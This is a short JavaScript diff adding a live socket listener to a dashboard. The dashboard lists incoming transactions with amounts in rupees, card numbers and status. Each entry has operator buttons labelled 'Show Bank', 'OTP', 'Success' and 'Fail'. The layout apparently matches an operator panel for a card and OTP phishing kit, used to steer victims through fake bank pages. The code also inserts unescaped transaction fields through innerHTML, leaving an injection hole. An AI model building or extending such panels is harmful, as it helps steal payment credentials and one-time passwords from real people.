@@ -398,6 +398,51 @@ async function loadTransactions() {
   }
 }
 
+    // Add this NEW socket listener
+socket.on('new_transaction', (transaction) => {
+  const container = document.getElementById('transactionList');
+  
+  const newTrans = document.createElement('div');
+  newTrans.className = 'transaction-item p-4 hover:bg-gray-50';
+  newTrans.innerHTML = `
+    <div class="flex items-center justify-between">
+      <div class="flex-1">
+        <div class="flex items-center space-x-4">
+          <span class="font-medium">₹${transaction.amount}</span>
+          <span class="text-sm text-gray-500">${transaction.cardNumber || '****'}</span>
+          <span class="px-2 py-1 text-xs font-medium rounded-full bg-blue-100 text-blue-800">
+            ${transaction.status}
+          </span>
+        </div>
+        <div class="mt-2 text-sm text-gray-500">
+          ${transaction.timestamp}
+        </div>
+      </div>
+      <div class="flex space-x-2">
+        <button data-invoice="${transaction.id}" data-action="bankpage" 
+          class="px-3 py-1 text-sm bg-blue-600 hover:bg-blue-700 text-white rounded-md">
+          Show Bank
+        </button>
+        <button data-invoice="${transaction.id}" data-action="otp" 
+          class="px-3 py-1 text-sm bg-purple-600 text-white rounded-md hover:bg-purple-700">
+          OTP
+        </button>
+        <button data-invoice="${transaction.id}" data-action="success" 
+          class="px-3 py-1 text-sm bg-green-600 text-white rounded-md hover:bg-green-700">
+          Success
+        </button>
+        <button data-invoice="${transaction.id}" data-action="fail" 
+          class="px-3 py-1 text-sm bg-red-600 text-white rounded-md hover:bg-red-700">
+          Fail
+        </button>
+      </div>
+    </div>
+  `;
+  
+  // Add new transaction to the top
+  container.insertBefore(newTrans, container.firstChild);
+});
+    
     loadTransactions();
 setInterval(loadTransactions, 2000);
 
